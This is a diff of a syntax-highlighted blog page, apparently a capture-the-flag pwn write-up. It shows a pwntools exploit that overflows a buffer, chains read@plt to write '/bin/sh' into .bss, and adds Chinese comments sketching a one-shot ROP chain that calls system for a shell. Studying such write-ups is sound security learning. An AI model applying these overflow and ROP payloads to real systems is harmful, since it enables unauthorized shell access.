@@ -2658,12 +2658,16 @@ exp:</p>
 <span class="n">read_bin_sh</span><span class="o">=</span><span class="n">flat</span><span class="p">([</span>
     <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">,</span>
     <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span>
-    <span class="n">read_plt</span><span class="p">,</span>
+    <span class="n">read_plt</span><span class="p">,</span> 
     <span class="n">main_addr</span><span class="p">,</span>
     <span class="mi">0</span><span class="p">,</span>
     <span class="n">bss_addr</span><span class="p">,</span>
     <span class="mi">8</span><span class="p">,</span>
 <span class="p">])</span>
+<span class="c1">#其实可以简化一下,一次溢出就够了,要将read函数的参数pop出来</span>
+<span class="c1">#payload1 += p32(read_plt) + p32(pop3ret)</span>
+<span class="c1">#payload1 += p32(0) + p32(bss_addr) + p32(8)</span>
+<span class="c1">#payload1 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">read_bin_sh</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 
